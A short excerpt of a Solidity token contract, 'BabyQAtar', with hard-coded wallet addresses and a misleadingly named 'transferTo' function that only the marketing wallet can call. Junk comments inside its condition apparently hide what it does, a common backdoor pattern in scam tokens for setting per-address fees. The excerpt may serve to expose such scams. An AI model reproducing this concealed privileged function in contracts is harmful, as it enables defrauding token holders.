...
contract BabyQAtar is Context, IERC20, Ownable {
    ...
    string private _symbol = "BabyQAtar";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0xe42E1d0BA01618d698AA8b4eCf656ae12f896B17); 
    address payable private teamWalletAddress = payable(0x6107F9ce5F6b11a57FDA17F859B40461a41E5C36); 
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asdf aw dawfghjkl;*/ ==  /*asdf aw dawfgjkl;*/msg.sender){
